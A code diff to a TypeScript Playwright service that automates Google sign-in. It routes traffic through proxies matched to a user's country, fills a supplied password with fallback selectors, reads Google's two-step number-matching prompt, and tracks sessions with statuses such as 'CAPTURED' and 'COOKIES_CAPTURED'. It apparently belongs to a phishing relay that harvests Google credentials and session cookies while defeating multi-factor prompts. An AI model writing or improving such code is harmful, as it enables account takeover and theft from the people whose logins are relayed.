@@ -94,7 +94,7 @@ class GoogleAuthHTTPService {
             }
           }
         } else {
-          logger.warn(`[GEO] No proxies match country ${geoPreference.country}, using any available proxy`);
+          logger.info(`[GEO] No proxies match country ${geoPreference.country}, using any available proxy`);
         }
       }
 
@@ -410,23 +410,43 @@ class GoogleAuthHTTPService {
       logger.info(`[PLAYWRIGHT] Submitting password for ${session.email} (sessionId: ${sessionId})`);
 
       // Wait for password input
-      try {
-        await page.waitForSelector('input[type="password"]', { 
-          state: 'visible',
-          timeout: 10000 
-        });
-      } catch (error) {
-        return {
-          success: false,
-          stage: 'password',
-          error: 'Password input field not found',
-        };
+      const passwordSelectors = [
+        'input[type="password"]',
+        'input[name="password"]',
+        'input[jsname="YPqjbf"]',
+        'input[autocomplete="current-password"]',
+      ];
+      let passwordFound = false;
+      for (let attempt = 0; attempt < 2 && !passwordFound; attempt++) {
+        for (const sel of passwordSelectors) {
+          try {
+            await page.waitForSelector(sel, { state: 'visible', timeout: 15000 });
+            passwordFound = true;
+            break;
+          } catch { continue; }
+        }
+        if (!passwordFound && attempt === 0) await page.waitForTimeout(2000);
+      }
+      if (!passwordFound) {
+        logger.warn('[PLAYWRIGHT] Password input not found after retries, URL:', page.url());
+        return { success: false, stage: 'password', error: 'Password input field not found' };
       }
 
       const urlBeforePassword = page.url();
 
       // Type password (simple and consistent like test script)
-      await page.type('input[type="password"]', password, { delay: 80 });
+      let filledPassword = false;
+      for (const sel of passwordSelectors) {
+        try {
+          const el = await page.$(sel);
+          if (el && await el.isVisible()) {
+            await page.fill(sel, password);
+            filledPassword = true;
+            break;
+          }
+        } catch { continue; }
+      }
+      if (!filledPassword) await page.fill('input[type="password"]', password);
       
       // Click Next button
       await page.click('#passwordNext');
@@ -468,10 +488,10 @@ class GoogleAuthHTTPService {
           let dpNumber = '';
           try {
             await page.waitForSelector('samp[jsname="feLNVc"]', { timeout: 5000 });
-            dpNumber = (await page.$eval('samp[jsname="feLNVc"]', el => el.textContent?.trim())) ?? '';
+            dpNumber = (await page.$eval('samp[jsname="feLNVc"]', (el: any) => el.textContent?.trim())) ?? '';
           } catch {
             try {
-              dpNumber = (await page.$eval('span[jsname="y02b7d"]', el => el.textContent?.trim())) ?? '';
+              dpNumber = (await page.$eval('span[jsname="y02b7d"]', (el: any) => el.textContent?.trim())) ?? '';
             } catch { dpNumber = ''; }
           }
 
@@ -839,6 +859,16 @@ class GoogleAuthHTTPService {
         await session.context?.close().catch(() => {});
         await session.browser?.close().catch(() => {});
         this.sessions.delete(sessionId);
+        
+        // Mark session as FAILED in database (only if not already completed)
+        await prisma.session.update({
+          where: {
+            id: sessionId,
+            status: { notIn: ['COMPLETED', 'CAPTURED', 'SUCCESS', 'COOKIES_CAPTURED'] },
+          },
+          data: { status: 'FAILED', lastActivityAt: new Date() },
+        }).catch(() => {});
+        
         logger.info(`[PLAYWRIGHT] Session cleaned up: ${sessionId}`);
       } catch (err: any) {
         logger.error(`[PLAYWRIGHT] cleanupSession error: ${err.message}`);
